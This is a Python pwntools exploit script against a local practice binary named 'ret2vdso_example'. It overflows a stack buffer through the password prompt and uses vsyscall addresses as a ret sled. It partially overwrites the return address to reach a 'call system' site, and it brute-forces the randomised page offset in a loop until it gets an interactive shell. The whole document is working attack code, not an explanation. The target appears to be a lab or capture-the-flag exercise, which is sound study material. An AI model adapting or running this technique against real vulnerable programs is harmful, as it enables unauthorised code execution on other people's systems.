import os
import pwn
import struct

pwn.context.clear()
pwn.context.update(
	arch = 'amd64', os = 'linux'
)

target_info = {
	'exec_path': './ret2vdso_example',
	'addr_len': 0x8,
	'bfvar2stack': 0x50,
	'call_system_offset': 0x1251,
	'vsyscall_base': 0xffffffffff600400,
	'page_size': 0x1000,
}

'''
| buffer | caller rbp | callee return |
'''

def exploit_run(fix_size):
	global conn
	conn = pwn.process([target_info['exec_path']])

	payload = b'A' * target_info['bfvar2stack']
	payload += b'B' * target_info['addr_len']
	payload += pwn.p64(target_info['vsyscall_base']) * 0x2
	offset = target_info['call_system_offset'] + fix_size
	print('[**] offset: {}'.format(hex(offset)))
	payload += struct.pack("<H", offset)

	pwn.pause()

	conn.sendafter(b'user name:\n', b'fuck')
	conn.sendafter(b'password:\n', payload)
	ret = conn.recvline()
	print('[**] receive: {0}'.format(ret))

	conn.recv(timeout = 5)

if __name__ == '__main__':
	num = 0
	pwn.context.binary = pwn.ELF(target_info['exec_path'])
	while True:
		try:
			print('num of try {}'.format(num))
			exploit_run(target_info['page_size'] * (num % 16))
			conn.interactive()
			break
		except KeyboardInterrupt:
			print('stop by [ctrl + c]')
			break
		except:
			conn.close()
			num += 1
			continue
